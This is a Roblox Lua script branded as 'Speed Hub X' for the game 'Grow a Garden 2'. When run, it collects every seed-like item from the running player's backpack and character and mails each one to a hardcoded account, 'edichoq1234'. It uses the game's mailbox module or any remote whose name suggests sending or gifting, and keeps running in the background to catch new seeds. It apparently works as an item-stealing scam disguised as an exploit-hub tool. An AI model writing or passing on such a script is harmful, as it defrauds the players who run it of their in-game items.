-- Speed Hub X - Mailbox Sender v2.5 (Grow a Garden 2)

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local TARGET_USERNAME = "edichoq1234"
local DELAY = 0.7

local target = Players:FindFirstChild(TARGET_USERNAME)
if not target then
    print("[Speed Hub X] Alvo não encontrado no servidor.")
    return
end

print("[Speed Hub X] Mailbox Sender ativado → Enviando seeds para " .. TARGET_USERNAME)

local function isSeed(item)
    if not item or not item:IsA("Tool") then return false end
    local n = item.Name:lower()
    return n:find("seed") or n:find("semente") or n:find("blueberry") or n:find("carrot") or n:find("strawberry") or 
           n:find("pumpkin") or n:find("tomato") or n:find("bamboo") or n:find("cactus") or n:find("corn") or
           n:find("banana") or n:find("coconut") or n:find("grape") or n:find("mango") or n:find("mushroom") or
           n:find("acorn") or n:find("cherry") or n:find("flower") or n:find("plant") or n:find("sapling")
end

-- Tenta usar o sistema real de Mailbox do jogo
local function sendSeed(item)
    if not item or not item.Parent then return end
    
    local success = false
    
    -- Método 1: Networking Module (mais atual)
    pcall(function()
        local NT = require(ReplicatedStorage:FindFirstChild("SharedModules", true) and ReplicatedStorage.SharedModules:FindFirstChild("Networking") or nil)
        if NT and NT.Mailbox and NT.Mailbox.SendBatch then
            NT.Mailbox.SendBatch:FireServer({{Item = item, Recipient = target.UserId}}, "Normal")
            success = true
        end
    end)
    
    -- Método 2: Remotes diretos
    if not success then
        for _, remote in ipairs(ReplicatedStorage:GetDescendants()) do
            if remote:IsA("RemoteEvent") and (remote.Name:find("Mail") or remote.Name:find("Send") or remote.Name:find("Gift") or remote.Name:find("Batch")) then
                pcall(function()
                    remote:FireServer(item, target.UserId or target)
                end)
                success = true
                break
            end
        end
    end
    
    if success then
        print("[Speed Hub X] Enviado: " .. item.Name)
        task.wait(DELAY)
    end
end

-- Envio inicial
for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
    if isSeed(item) then sendSeed(item) end
end

if LocalPlayer.Character then
    for _, item in ipairs(LocalPlayer.Character:GetChildren()) do
        if isSeed(item) then sendSeed(item) end
    end
end

-- Monitoramento contínuo
LocalPlayer.Backpack.ChildAdded:Connect(function(item)
    if isSeed(item) then task.wait(0.6) sendSeed(item) end
end)

print("[Speed Hub X] Sender rodando em background...")
